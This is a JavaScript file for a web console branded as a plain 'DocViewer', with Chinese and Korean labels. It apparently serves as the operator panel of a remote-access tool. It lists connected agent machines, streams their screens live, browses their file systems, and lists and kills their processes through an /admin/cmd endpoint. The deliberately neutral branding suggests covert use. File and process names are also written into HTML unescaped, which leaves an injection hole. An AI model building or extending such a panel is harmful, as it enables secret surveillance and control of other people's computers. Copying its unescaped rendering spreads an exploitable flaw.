/* DocViewer admin console — i18n (default zh-CN, ko toggle) + API access.
  * Neutral admin console (plain document-viewer branding). */
(function () {
  "use strict";

  var I18N = {
    "zh-CN": {
      "app": "DocViewer",
      "login.sub": "请输入访问授权码进行连接",
      "login.ph": "访问授权码",
      "login.btn": "连接",
      "login.err": "授权码无效或无法连接",
      "tab.screen": "远程桌面",
      "tab.file": "文件管理",
      "tab.process": "进程",
      "btn.refresh": "刷新",
      "status.connected": "已连接",
      "sidebar.title": "设备列表",
      "search": "搜索...",
      "screen.connecting": "请选择一个设备查看远程桌面。",
      "file.todo": "文件管理功能将在后续版本开放。",
      "proc.todo": "进程列表功能将在后续版本开放。",
      "info.title": "设备信息",
      "info.host": "主机名", "info.addr": "地址", "info.os": "系统",
      "info.state": "状态", "info.status": "设备号",
      "mode.title": "连接信息", "mode.game": "运行状态", "mode.last": "最后在线",
      "state.online": "在线", "state.offline": "离线",
      "proc.pid": "PID", "proc.name": "进程名", "proc.kill": "结束",
      "file.updir": "返回上级", "file.dir": "目录", "file.file": "文件",
      "file.name": "名称",
      "file.size": "大小", "file.modified": "修改时间",
      "file.err": "读取目录失败",
      "proc.err": "获取进程列表失败", "proc.killed": "进程已终止",
      "file.refresh": "刷新"
    },
    "ko": {
      "app": "DocViewer",
      "login.sub": "접속 인증 키를 입력해 연결하세요",
      "login.ph": "접속 인증 키",
      "login.btn": "연결",
      "login.err": "인증키가 올바르지 않거나 연결할 수 없습니다",
      "tab.screen": "원격 화면",
      "tab.file": "파일 관리",
      "tab.process": "프로세스",
      "btn.refresh": "새로고침",
      "status.connected": "연결됨",
      "sidebar.title": "장비 목록",
      "search": "검색...",
      "screen.connecting": "장비를 선택하면 원격 화면을 볼 수 있습니다.",
      "file.todo": "파일 관리 기능은 다음 단계에서 제공됩니다.",
      "proc.todo": "프로세스 목록 기능은 다음 단계에서 제공됩니다.",
      "info.title": "장비 정보",
      "info.host": "호스트명", "info.addr": "주소", "info.os": "OS",
      "info.state": "상태", "info.status": "장비 ID",
      "mode.label": "연결 정보", "mode.game": "실행 상태", "mode.last": "최근 접속",
      "state.online": "온라인", "state.offline": "오프라인",
      "proc.pid": "PID", "proc.name": "프로세스명", "proc.kill": "종료",
      "file.updir": "상위 폴더", "file.dir": "폴더", "file.file": "파일",
      "file.name": "이름",
      "file.size": "크기", "file.modified": "수정일",
      "file.err": "디렉토리 읽기 실패",
      "proc.err": "프로세스 목록 조회 실패", "proc.killed": "프로세스 종료됨",
      "file.refresh": "새로고침"
    }
  };

  var lang = null, devices = [], selectedId = null, token = null, currentStreamId = null,
  fileCache = {}, procCache = [];

  function t(key) {
    var k = lang in I18N ? lang : "zh-CN";
    return (I18N[k] && I18N[k][key]) || key;
  }

  function setLang(l, apply) {
    lang = l;
    if (apply) { document.documentElement.lang = l; document.querySelectorAll("[data-i18n]").forEach(function (el) {
      el.textContent = t(el.getAttribute("data-i18n"));
    });
      document.querySelectorAll("[data-i18n-ph]").forEach(function (el) {
        el.placeholder = t(el.getAttribute("data-i18n-ph"));
      });
    }
  }

  function applyI18n() {
    var saved = localStorage.getItem("docviewer_lang") || "zh-CN";
    setLang(saved, true);
  }

  /* ---------- API ---------- */
  function api(path, opts) {
    opts = opts || {};
    opts.headers = Object.assign({}, opts.headers || {});
    if (token) opts.headers["X-Auth-Token"] = token;
    if (opts.json !== undefined) {
      opts.headers["Content-Type"] = "application/json";
      opts.body = JSON.stringify(opts.json);
      delete opts.json;
    }
    return fetch(path, opts).then(function (r) {
      if (r.status === 401) { showLogin(true); throw new Error("unauthorized"); }
      return r.json().then(function (j) { if (!r.ok) { var e = new Error(j.error || r.status); e.json = j; throw e; } return j; });
    });
  }

  /* ---------- views ---------- */
  function showLogin(show) {
    document.getElementById("login-view").classList.toggle("hidden", !show);
    document.getElementById("app-view").classList.toggle("hidden", show);
    if (show) document.getElementById("login-token").focus();
  }

  function setConn(ok) {
    var dot = document.getElementById("conn-dot");
    dot.classList.toggle("offline", !ok);
    document.getElementById("conn-dot").style.background = ok ? "#2ecc71" : "#777";
    document.getElementById("conn-text").textContent = ok ? t("status.connected") : t("state.offline");
  }

  function renderAgents() {
    var list = document.getElementById("dev-list");
    var q = (document.getElementById("dev-search").value || "").toLowerCase();
    var shown = devices.filter(function (a) {
      if (!q) return true;
      return (a.id || "").toLowerCase().indexOf(q) >= 0 || (a.hostname || "").toLowerCase().indexOf(q) >= 0;
    });
    document.getElementById("dev-count").textContent = devices.length;
    document.getElementById("st-online").textContent = devices.filter(function (a) { return a.online; }).length;
    list.innerHTML = "";

    if (!shown.length) {
      list.innerHTML = '<div class="muted" style="padding:12px">—</div>';
      return;
    }
    shown.forEach(function (a) {
      var div = document.createElement("div");
      div.className = "dev-item" + (a.id === selectedId ? " active" : "");
      var dotCls = "offline";
      if (a.online) dotCls = a.game_active ? "game" : "online";
      var ip = a.remote_addr ? a.remote_addr.split(":")[0] : "-";
      div.innerHTML = '<div class="dev-dot ' + dotCls + '"></div>' +
        '<div class="dev-info"><div class="dev-name"></div><div class="dev-ip"></div></div>';
      div.querySelector(".dev-name").textContent = a.hostname || a.id;
      div.querySelector(".dev-ip").textContent = ip + " · " + (a.os || "");
      div.onclick = function () { selectDevice(a); };
      list.appendChild(div);
    });
  }

  function selectDevice(a) {
    if (selectedId !== a.id) stopStream();
    selectedId = a.id;
    var info = document.getElementById("info-host"); info.textContent = a.hostname || a.id;
    document.getElementById("info-addr").textContent = a.remote_addr || "-";
    document.getElementById("info-os").textContent = (a.os || "-") + " " + (a.arch || "");
    var st = document.getElementById("info-state");
    st.textContent = a.online ? t("state.online") : t("state.offline");
    st.style.color = a.online ? "#2ecc71" : "#777";
    document.getElementById("info-id").textContent = a.id;
    document.getElementById("info-game").textContent = a.game_id || (a.game_active ? t("state.online") : "-");
    document.getElementById("info-last").textContent = (a.last_seen || "").replace("T", " ").slice(0, 19);
    renderAgents();
    // fetch a live frame for the selected device if online
    if (a.online) { startStream(a.id); fetchFrame(a.id); } else showPlaceholder();
  }

  function sendCmd(agentId, cmdType, payload) {
    return api("/admin/cmd", { method: "POST",
      json: { agent_id: agentId, cmd_type: cmdType, payload: payload || "" } }).catch(function () {});
  }

  function startStream(id) {
    if (currentStreamId === id) return;
    stopStream();
    currentStreamId = id;
    sendCmd(id, "stream_start", JSON.stringify({ fps: 5, quality: 70, max_dim: 1280 }));
  }

  function stopStream() {
    if (!currentStreamId) return;
    var id = currentStreamId;
    currentStreamId = null;
    sendCmd(id, "stream_stop", "");
  }

  function showPlaceholder() {
    var s = document.getElementById("live-screen");
    s.innerHTML = '<span class="connecting-msg" data-i18n="screen.connecting"></span>';
    if (s.querySelector("[data-i18n]")) s.querySelector("[data-i18n]").textContent = t("screen.connecting");
    setConn(false);
  }

  function fetchFrame(aId) {
    var s = document.getElementById("live-screen");
    api("/admin/stream?agent_id=" + encodeURIComponent(aId) + "&wait_sec=1").then(function (f) {
      if (!f || !f.data_b64 || aId !== selectedId) return;
      var mime = f.mime || "image/png";
      s.innerHTML = '<img src="data:' + mime + ';base64,' + f.data_b64 + '" alt="frame">';
      setConn(true);
      setTimeout(function () { if (aId === selectedId) fetchFrame(aId); }, 180);
    }).catch(function () { setTimeout(function () { if (aId === selectedId) fetchFrame(aId); }, 1000); });
  }

  function refreshAgents() {
    api("/admin/agents").then(function (d) {
      devices = d.agents || [];
      renderAgents();
      if (!selectedId && devices.length) selectDevice(devices[0]);
      if (selectedId) {
        var cur = devices.filter(function (a) { return a.id === selectedId; })[0];
        if (cur) selectDevice(cur);
      }
      setConn(true);
      showLogin(false);
    }).catch(function () { showLogin(true); });
  }

  /* ---------- boot ---------- */
  document.addEventListener("DOMContentLoaded", function () {
    applyI18n();

    document.getElementById("lang-toggle").addEventListener("click", function () {
      var next = lang === "ko" ? "zh-CN" : "ko";
      localStorage.setItem("docviewer_lang", next);
      setLang(next, true);
    });

    document.querySelectorAll("[data-tab]").forEach(function (b) {
      b.addEventListener("click", function () {
        document.querySelectorAll("[data-tab]").forEach(function (x) { x.classList.remove("active"); });
        b.classList.add("active");
        var target = b.getAttribute("data-tab");
        ["screen", "file", "process"].forEach(function (id) {
          document.getElementById("tab-" + id).classList.toggle("active", id === target);
        });
        document.getElementById("tab-" + target).classList.add("active");
      });
    });

    document.getElementById("btn-refresh").addEventListener("click", refreshAgents);
    document.getElementById("dev-search").addEventListener("input", renderAgents);
    // file browser
    document.getElementById("file-go-btn").addEventListener("click", function () {
      browseDir(document.getElementById("file-path-input").value);
    });
    document.getElementById("file-path-input").addEventListener("keydown", function (e) {
      if (e.key === "Enter") browseDir(this.value);
    });
    // process list
    document.getElementById("proc-refresh").addEventListener("click", refreshProcs);
    document.getElementById("proc-search").addEventListener("input", renderProcs);
    setInterval(refreshAgents, 4000);

    document.getElementById("login-btn").addEventListener("click", doLogin);
    document.getElementById("login-token").addEventListener("keydown", function (e) { if (e.key === "Enter") doLogin(); });

    // restore session if a token was saved before
    var saved = localStorage.getItem("docviewer_token");
    if (saved && saved !== "") {
      token = saved;
      showLogin(false);
      refreshAgents();
    } else {
      showLogin(true);
    }
  });

  function doLogin() {
    var v = document.getElementById("login-token").value.trim();
    if (!v) return;
    token = v;
    localStorage.setItem("docviewer_token", v);
    api("/admin/agents").then(function () {
      showLogin(false);
      refreshAgents();
    }).catch(function () {
      var el = document.getElementById("login-error");
      el.textContent = t("login.err") || t("login.sub");
      el.classList.remove("hidden");
    });
  }

  /* ---------- file browser ---------- */
  function pollCmd(id) {
    return api("/admin/jobs?agent_id=" + encodeURIComponent(selectedId) + "&status=done&limit=50").then(function (d) {
      var jobs = d.jobs || [];
      for (var i = 0; i < jobs.length; i++) {
        if (jobs[i].id === id) return jobs[i];
      }
      return null;
    });
  }

  function browseDir(path) {
    if (!selectedId) return;
    sendCmd(selectedId, "list_dir", JSON.stringify({ path: path })).then(function (j) {
      if (!j || !j.command_id) return;
      var poll = setInterval(function () {
        pollCmd(j.command_id).then(function (job) {
          if (!job) return;
          clearInterval(poll);
          if (!job.success || !job.result) {
            document.getElementById("file-browser").innerHTML = '<div class="muted">' + t("file.err") + '</div>';
            return;
          }
          var entries;
          try { entries = JSON.parse(job.result); } catch(e) { entries = []; }
          renderFileList(path, entries);
        });
      }, 300);
    });
  }

  function renderFileList(curPath, entries) {
    var container = document.getElementById("file-browser");
    if (!entries || !entries.length) {
      container.innerHTML = '<div class="muted">-</div>';
      return;
    }
    var html = '<div class="file-header"><span>' + t("file.name") + '</span><span>' + t("file.size") + '</span><span>' + t("file.modified") + '</span></div>';
    // parent dir link
    if (curPath !== "/" && curPath !== "") {
      html += '<div class="file-row file-up" data-path="' + encodeURI(dirParent(curPath)) + '"><span>' + t("file.updir") + ' ..</span></div>';
    }
    entries.forEach(function (e) {
      var icon = e.is_dir ? "📁" : "📄";
      var name = e.name;
      var size = e.is_dir ? "-" : fmtSize(e.size);
      var mtime = e.mtime ? new Date(e.mtime * 1000).toLocaleString() : "-";
      var cls = e.is_dir ? ' file-dir' : '';
      html += '<div class="file-row' + cls + '" data-path="' + encodeURI(curPath.replace(/\\+$/, "") + "\\" + name) + '">';
      html += '<span>' + icon + ' ' + name + '</span><span class="file-size">' + size + '</span><span class="file-mtime">' + mtime + '</span>';
      html += '</div>';
    });
    container.innerHTML = html;
    // click handlers
    container.querySelectorAll(".file-row").forEach(function (row) {
      row.addEventListener("click", function () {
        var p = decodeURI(row.getAttribute("data-path"));
        if (row.classList.contains("file-up") || row.classList.contains("file-dir")) {
          document.getElementById("file-path-input").value = p;
          browseDir(p);
        }
      });
    });
    container.querySelectorAll(".file-dir").forEach(function (row) {
      row.style.cursor = "pointer";
    });
  }

  function dirParent(path) {
    path = path.replace(/\\+$/, "");
    var idx = Math.max(path.lastIndexOf("\\"), path.lastIndexOf("/"));
    if (idx <= 0) return "C:\\";
    return path.substring(0, idx);
  }

  function fmtSize(bytes) {
    if (bytes < 1024) return bytes + " B";
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + " KB";
    if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + " MB";
    return (bytes / (1024 * 1024 * 1024)).toFixed(1) + " GB";
  }

  /* ---------- process list ---------- */
  function refreshProcs() {
    if (!selectedId) return;
    sendCmd(selectedId, "ps_list", "").then(function (j) {
      if (!j || !j.command_id) return;
      var poll = setInterval(function () {
        pollCmd(j.command_id).then(function (job) {
          if (!job) return;
          clearInterval(poll);
          if (!job.success || !job.result) {
            document.getElementById("proc-tbody").innerHTML = '<tr><td colspan="3" class="muted">' + t("proc.err") + '</td></tr>';
            return;
          }
          var procs;
          try { procs = JSON.parse(job.result); } catch(e) { procs = []; }
          procCache = procs;
          renderProcs();
        });
      }, 300);
    });
  }

  function renderProcs() {
    var q = (document.getElementById("proc-search").value || "").toLowerCase();
    var filtered = procCache.filter(function (p) {
      return !q || (p.name || "").toLowerCase().indexOf(q) >= 0 || String(p.pid).indexOf(q) >= 0;
    });
    var tbody = document.getElementById("proc-tbody");
    tbody.innerHTML = "";
    filtered.forEach(function (p) {
      var tr = document.createElement("tr");
      tr.innerHTML = '<td class="mono">' + p.pid + '</td><td>' + (p.name || "?") + '</td>'
        + '<td><button class="toolbar-btn kill-btn" data-pid="' + p.pid + '">' + t("proc.kill") + '</button></td>';
      tbody.appendChild(tr);
    });
    tbody.querySelectorAll(".kill-btn").forEach(function (btn) {
      btn.addEventListener("click", function (e) {
        e.stopPropagation();
        var pid = parseInt(btn.getAttribute("data-pid"));
        if (confirm("Kill PID " + pid + "?")) killProc(pid);
      });
    });
  }

  function killProc(pid) {
    if (!selectedId) return;
    sendCmd(selectedId, "ps_kill", JSON.stringify({ pid: pid })).then(function (j) {
      if (!j || !j.command_id) return;
      var poll = setInterval(function () {
        pollCmd(j.command_id).then(function (job) {
          if (!job) return;
          clearInterval(poll);
          refreshProcs();
        });
      }, 300);
    });
  }
})();